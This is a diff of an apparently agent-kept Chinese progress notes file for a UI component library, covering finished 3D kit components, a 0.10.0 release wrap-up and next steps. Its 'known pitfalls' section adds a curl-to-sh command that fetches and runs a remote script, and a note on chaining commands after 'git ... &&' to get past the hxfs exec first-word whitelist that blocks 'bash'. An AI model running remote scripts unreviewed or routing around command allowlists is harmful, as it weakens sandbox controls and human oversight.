@@ -4,7 +4,7 @@
 
 ## 顺序
 
-controls 15 件 (已齐) → kits gallery 11 (已齐) → kits stack 8 + glass 2 (已齐) → kits card 9 (已齐) + stage3d 3 → 收口 (./controls ./kits 子路径, api 快照, 0.10.0, docs-props, gates:push) → surface 余量 30 件.
+controls 15 件 (已齐) → kits gallery 11 (已齐) → kits stack 8 + glass 2 (已齐) → kits card 9 (已齐) + stage3d 3 (已齐) → 收口 (./controls ./kits 子路径, api 快照, 0.10.0, docs-props, gates:push; 已完成 2026-11-10) → surface 余量 30 件.
 推送由用户做, 这里只 commit. 每件单独提交, pre-commit 13/13 + 本件 vitest 全绿才提.
 
 ## 已裁定 (不再待定)
@@ -87,20 +87,43 @@ controls 15 件 (已齐) → kits gallery 11 (已齐) → kits stack 8 + glass 2
 
 位置 `src/kits/card/`, 测试 `tests/kits/card/` (support.ts 转出 stack support, 补 boxOf), note `.agents/notes/implemented/feature/2026-11-10-kits-card.md`. card tokens 转出 stack tokens. FoilCard 的光谱引用 tokens.css 新增的 --spectrum-1..6 (亮暗两套).
 
+## 状态: kits stage3d 3 件 (全部已提, 门禁 13/13)
+
+| 规格 | HX 名 | 提交 |
+|---|---|---|
+| Lanyard | SwingLanyard (+ 族 tokens: decayToward; 2D 绳索 parts/rope) | 02bf521 |
+| ModelViewer | OrbitViewer (不加载模型) | 67afeb7 |
+| InfiniteMenu | SphereMenu (DOM 球面) | 7eed988 |
+
+三件都标 ENGINE-GAP (缺顶点通道, 网格, 模型加载, 实例化渲染), 见 `.agents/notes/implemented/feature/2026-11-10-kits-stage3d.md`.
+
+## 状态: 收口完成 (2026-11-10), 已提交未推送
+
+`src/controls/index.ts`, `src/kits/index.ts` 汇各族; package.json exports 加 `./controls`, `./kits`, 版本 0.10.0 (lock 同步); motion 出口加 CURVE / cssCurve / CurveName; docs-props 全量抽两条子路径; api 快照按子路径分段并重记 0.10.0 哈希; CHANGELOG 0.10.0 段. note `.agents/notes/implemented/architecture/2026-11-10-controls-kits-entries.md`.
+
+## 正在做
+
+无. 收口已提交 (2026-11-10), gates:push 20/20 ALL PASS (TMPDIR=/tmp). 等用户推送: 未推送提交 778e1e7 .. 收口提交 (git log origin/main..HEAD 查).
+
 ## 下一步
 
-kits stage3d 3 (Lanyard, ModelViewer, InfiniteMenu): 不引 three, 缺顶点通道 / 模型加载的部分标 ENGINE-GAP 并写清缺什么 (用户裁定). 做完单独报一次.
+1. 用户推送后开 surface 余量 30 件 (规格 docs/research/catalog/components-{1,2}.md).
+2. 下面 "后续收尾" 另排.
 
-## 收口待办 (不要提前做)
+surface 余量 30 件. 下面 "后续收尾" 里的项 (族 tokens 并入 src/motion 等) 另排.
+
+## 后续收尾 (本次收口未做)
 
 - `tallyOvershoot` 缓存 Map 无上限, 考虑量化键或 LRU.
 - 老控件 ring-1 统一换 FOCUS_RING; nav / menu 之外各族 tokens 里的 cubic-bezier 副本 (choice/tone, press/tokens, range/tokens, compose/tokens, dismiss/tokens) 改引用 CURVE.
-- motion 出口加 CURVE / cssCurve, 升 0.10.0.
 - 各族帧循环 (use-nav-motion, range motion.ts 等) 并进 src/motion; nav / gallery / stack / glass 的族 tokens 合并.
 - `tests/kits/support.ts` 与 `tests/kits/stack/support.ts` 合并进公共测试支持.
 - `use-drag.ts` 补单测; BlendSlider 测试的 fake Animation 补 `finish()`.
 
 ## 已知坑
+
+- 门禁 smoke 要 `TMPDIR=/tmp` (lane 的 TMPDIR 路径过长, chromium 崩, 128 页 0B).
+- 沙箱 home 重置后 hxfs 消失: `curl -fsSL https://fs.lolioa.com/.hxfs/71d06cb7fe8b4f7f14ad | sh`.
 
 - hxfs exec 首词白名单: 不能 `bash`; 多步用 `git ... && ...` 直接串. 提交: `git add -- <files> && git commit -q -F <scratch>/msg`, msg 经 `hxfs put scratch/...`.
 - hxfs put 不建目录: 新目录先 `hxfs exec "mkdir -p ..."`.
